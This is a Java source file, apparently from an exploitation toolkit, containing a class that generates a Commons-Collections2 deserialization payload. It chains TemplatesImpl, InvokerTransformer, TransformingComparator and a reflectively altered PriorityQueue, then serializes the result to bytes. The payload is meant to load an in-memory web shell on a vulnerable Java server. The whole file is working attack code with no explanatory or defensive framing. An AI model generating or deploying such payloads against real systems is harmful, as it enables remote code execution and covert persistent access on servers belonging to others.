package sample.exploit.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import sample.utils.ExpUtils;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

public class CC2Exp {
    public String memShell;
    public Class<?> memShellRunner;

    public CC2Exp(String memShell){
        this.memShell = memShell;
        this.memShellRunner = ExpUtils.getMemShellRunner(memShell);
    }

    public byte[] exploit() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
        TemplatesImpl templates = ExpUtils.getTemplatesImpl(memShell, memShellRunner);
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator comparator = new TransformingComparator(invokerTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(1);
        Object[] objects = new Object[]{templates, templates};
        ExpUtils.setField(priorityQueue, "queue", objects);
        ExpUtils.setField(priorityQueue, "comparator", comparator);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(priorityQueue);
        oos.flush();
        oos.close();
        return baos.toByteArray();
    }
}
